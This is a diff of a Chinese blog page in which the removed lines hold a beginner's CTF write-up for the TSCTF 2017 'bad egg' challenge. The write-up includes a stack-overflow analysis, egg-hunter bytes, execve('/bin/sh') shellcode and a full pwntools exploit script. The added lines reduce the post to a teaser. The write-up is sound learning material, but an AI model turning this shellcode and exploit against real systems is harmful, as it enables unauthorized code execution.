@@ -823,21 +823,9 @@
     <div class="article-entry" itemprop="articleBody">
       
           
-        <p>刚刚开始学习pwn，记录一下自己学习的过程。</p>
-<p>今天完成了第一道pwn题目的解答，做的题目是2017年TSCTF的bad egg，通过这道题学习到了一种getshell的方法：通过在大小不够存储shellcode的空间内写入egg_hunter使其去找到真正的shellcode所在的地址执行拿到shell。</p>
-<p>首先拿到题目用ida去查看：<br><img src="/2019/05/10/pwn学习之一/1.png" alt="ida"></p>
-<p>题目首先通过sub_8B0()生成了一个1000以内的随机数用来给dword_305C申请地址，这里用的malloc申请的地址是存在在堆中的，然后题目会把申请到的这块地址的首地址输出出来，接着又会在堆中申请一个256大小的空间(这里会是后面用来存放shellcode的位置)，接着执行sub_9AB()函数。</p>
-<p>　　进入sub_9AB()函数：<br><img src="/2019/05/10/pwn学习之一/2.png" alt="ida"><br>这个函数逻辑是先申请了int buf,int v2,char haystack[4]，这些申请的空间是存在在栈中的，首先要你输入treat or trick?，只有输入treat才会继续执行下面的代码，接着程序会把申请的haystack所在的栈地址告诉你，接下来输入name到haystack，这里read给的max位32位，而haystack只申请的4个字节的空间，所以在这里存在栈溢出，接着是往之前堆中申请的256大小的地址写入数据，然后程序结束。</p>
-<p>为了防止直接在栈上写shellcode本题的栈上可写空间只有20个字节(执行函数先push了参数这里无，然后返回地址4字节，再是ebp4字节，ebx4字节，再第一个int4字节，第二个int4字节再是haystack所以haystack和返回地址之间大小为20个字节)，而且对输入进行了”sh”过滤，同时为了防止构造ROP链，题目开了pie保护，即代码段随机化。</p>
-<p>那么解题思路为：将egg_hunter代码写入栈溢出位置，并将返回地址覆盖为造成栈溢出变量的起始地址，然后将egg_hunter的tag以及shellcode写入堆中，程序运行顺序为先写入栈中，再写入堆中，然后到返回地址为栈溢出的起始地址，所以执行egg_hunter程序，到堆中指定地址去找tag，找到了tag后执行随后的shellcode代码拿到shell。</p>
-<p>egg hunter汇编原理：<br><img src="/2019/05/10/pwn学习之一/3.png" alt="ida"><br>其实就是从eax的地址开始一直往下找直到找到内容和ebx的内容相同的地址，然后跳到该地址去执行。</p>
-<p>egg_hunter=”\xb8” + p32(chunk_addr) + “\xbb\x8f\x50\x90\x50\x43\x40\x39\x18\x75\xfb\xff\xe0\x01”。chunk_addr是最前面告诉我们的堆的地址。</p>
-<p>shellcode汇编代码：<br><img src="/2019/05/10/pwn学习之一/4.png" alt="ida"><br>意思是通过int80中断，调用号为11，即sys_execve()函数，参数是ebx这里为/bin/sh，即执行了sys_execve(‘/bin/sh’)。</p>
-<p>shellcode=’\x90\x50\x90\x50’+”\x90\x90\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80\x90\x90’</p>
-<p>前面要加上tag这里是“\x90\x50\x90\x50”。<br>exp：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#init</span></span><br><span class="line">debug = <span class="number">0</span></span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line">    io = process(<span class="string">'./egg'</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    io = remote(<span class="string">'127.0.0.1'</span>,<span class="number">2334</span>)</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line">    gdb.attach(pidof(<span class="string">'egg'</span>)[<span class="number">-1</span>],open(<span class="string">'zp'</span>))</span><br><span class="line"><span class="comment">#----------------------------------------------------------------</span></span><br><span class="line"></span><br><span class="line">shellcode = <span class="string">'\x90\x50\x90\x50'</span>+<span class="string">"\x90\x90\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80\x90\x90"</span></span><br><span class="line"><span class="keyword">print</span> io.recvuntil(<span class="string">'seat is '</span>)</span><br><span class="line">chunk_addr=int(io.recvuntil(<span class="string">'\n'</span>),<span class="number">16</span>)</span><br><span class="line"><span class="keyword">print</span> hex(chunk_addr)</span><br><span class="line"><span class="keyword">print</span> io.recvuntil(<span class="string">'trick? '</span>)</span><br><span class="line">io.sendline(<span class="string">'treat'</span>)</span><br><span class="line"><span class="keyword">print</span> io.recvuntil(<span class="string">'located in '</span>)</span><br><span class="line">stack_addr=int(io.recvuntil(<span class="string">'\n'</span>),<span class="number">16</span>)</span><br><span class="line"><span class="keyword">print</span> hex(stack_addr)</span><br><span class="line">io.recvuntil(<span class="string">'name?\n'</span>)</span><br><span class="line">egg_hunter=<span class="string">"\xb8"</span> + p32(chunk_addr) + <span class="string">"\xbb\x8f\x50\x90\x50\x43\x40\x39\x18\x75\xfb\xff\xe0\x01"</span></span><br><span class="line">payload = egg_hunter + <span class="string">'A'</span>*(<span class="number">20</span>-len(egg_hunter)) + p32(stack_addr) </span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.recvuntil(<span class="string">'here.\n'</span>)</span><br><span class="line">io.sendline(shellcode)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure></p>
-<p>pwn题目可用:socat tcp4-listen:2334,fork exec:./egg挂载，然后通过nc ip 2334去访问</p>
-<p>bad egg下载地址：<a href="http://files.cnblogs.com/files/lllkh/badegg.rar" target="_blank" rel="noopener">http://files.cnblogs.com/files/lllkh/badegg.rar</a></p>
-
+              <p>刚刚开始学习pwn，记录一下自己学习的过程。</p>
+<p>今天完成了第一道pwn题目的解答，做的题目是2017年TSCTF的bad egg，通过这道题学习到了一种getshell的方法：通过在大小不够存储shellcode的空间内写入egg_hunter使其去找到真正的shellcode所在的地址执行拿到shell。<br></p>
+          
       
     </div>
     
@@ -850,6 +838,10 @@
         <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/pwn/">pwn</a></li></ul>
     </div>
 
+      
+        <p class="article-more-link">
+          <a href="/2019/05/10/pwn学习之一/#more">阅读全文 >></a>
+        </p>
       
       <div class="clearfix"></div>
     </div>
